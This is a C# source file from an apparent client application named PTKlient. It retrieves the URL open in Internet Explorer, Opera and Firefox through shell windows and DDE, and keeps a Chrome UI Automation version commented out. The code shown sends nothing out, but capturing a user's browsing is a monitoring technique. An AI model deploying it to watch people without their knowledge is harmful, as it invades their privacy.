using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Web;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.IO;
using System.Media;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Security.Cryptography;
using Microsoft.Win32; // rejestry
using System.Reflection;
using System.Security.Permissions;
using System.Management;
using System.Net.Mime;
using System.Globalization;
//using System.Windows.Automation;
using NDde.Client;
using SHDocVw;
using System.Security;
using System.Runtime.InteropServices;
using UIAutomationClient;


namespace PTKlient
{
    class Browsers
    {
        Regex expolorer = new Regex("http", RegexOptions.IgnoreCase);
        /*
        public string GetBrowserChrome()
        {
            Process[] procsChrome = Process.GetProcessesByName("chrome");
            foreach (Process chrome in procsChrome)
            {
                // the chrome process must have a window
                if (chrome.MainWindowHandle == IntPtr.Zero)
                {
                    continue;
                }

                // find the automation element
                AutomationElement elm = AutomationElement.FromHandle(chrome.MainWindowHandle);
                AutomationElement elmUrlBar = elm.FindFirst(TreeScope.Descendants,
                  new PropertyCondition(AutomationElement.NameProperty, "Pasek adresu i wyszukiwania"));

                // if it can be found, get the value from the URL bar
                if (elmUrlBar != null)
                {
                    AutomationPattern[] patterns = elmUrlBar.GetSupportedPatterns();
                    if (patterns.Length > 0)
                    {
                        ValuePattern val = (ValuePattern)elmUrlBar.GetCurrentPattern(patterns[0]);

                        if (Regex.IsMatch(val.Current.Value, @"^(https:\/\/)?[a-zA-Z0-9\-\.]+(\.[a-zA-Z]{2,4}).*$"))
                        {
                            // prepend http:// to the url, because Chrome hides it if it's not SSL
                            if (!val.Current.Value.StartsWith("http"))
                            {
                                return "http://" + val.Current.Value;
                            }

                        }
                        return val.Current.Value;
                    }
                }
            }

            return "";
        }
        */
        public string GetBrowserExplorer()
        {
            //string str = Request.RawUrl;

            foreach (InternetExplorer ie in new ShellWindows())
            {
                //MessageBox.Show(ie.LocationURL);
                Match mi = expolorer.Match(ie.LocationURL);
                if (mi.Success)
                {
                    return ie.LocationURL;
                }
            }

            return "0";
        }

        public string GetBrowserOpera()
        {
            /*try
            {*/
            DdeClient dde = new DdeClient("Opera", "WWW_GetWindowInfo");
            dde.Connect();
            string url = dde.Request("URL", int.MaxValue);
            string[] text = url.Split(new string[] { "\",\"" }, StringSplitOptions.RemoveEmptyEntries);
            dde.Disconnect();
            return text[0].Substring(1);
            /*}
            catch
            {
                return null;
            }*/
        }

        public string GetBrowserFirefox()
        {
            try
            {
                DdeClient dde = new DdeClient("Firefox", "WWW_GetWindowInfo");
                dde.Connect();
                string url = dde.Request("URL", int.MaxValue);
                string[] text = url.Split(new string[] { "\",\"" }, StringSplitOptions.RemoveEmptyEntries);
                dde.Disconnect();
                return text[0].Substring(1);
            }
            catch
            {
                return null;
            }
        }

    }
}
